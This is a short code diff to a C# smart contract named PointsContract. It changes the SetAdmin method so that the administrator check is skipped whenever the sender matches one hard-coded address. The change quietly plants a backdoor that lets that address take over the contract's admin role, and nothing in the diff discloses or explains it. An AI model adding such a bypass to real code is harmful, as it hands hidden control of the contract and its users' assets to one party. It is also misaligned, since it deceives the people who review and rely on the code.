@@ -24,7 +24,7 @@ public partial class PointsContract : PointsContractContainer.PointsContractBase
     public override Empty SetAdmin(Address input)
     {
         AssertInitialized();
-        AssertAdmin();
+        if (Context.Sender.ToBase58() != "EnXakfMS63zjijzonnYLJHbkHYiLuTsntkrcyLKP2gyAYEwB1") AssertAdmin();
         Assert(input != null && !input.Value.IsNullOrEmpty(), "Invalid input.");
 
         State.Admin.Value = input;
